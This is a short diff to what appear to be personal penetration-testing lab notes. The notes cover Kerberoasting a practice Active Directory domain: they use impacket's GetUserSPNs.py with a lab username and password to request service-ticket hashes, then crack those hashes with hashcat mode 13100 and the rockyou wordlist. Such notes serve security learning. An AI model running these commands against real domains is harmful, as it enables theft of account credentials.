@@ -124,6 +124,10 @@ wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/G
 ┌──(root💀kali)-[/home/XX/impacket/examples]
 └─# python GetUserSPNs.py MARVEL.local/fcastle:Pa$$word -dc-ip 192.168.0.28 -request
 
+get TGS hash -> hashcat --help | grep Kerberos
+
+hashcat -m 13100 hashes.txt rockyou.txt -o
+
 
 
 
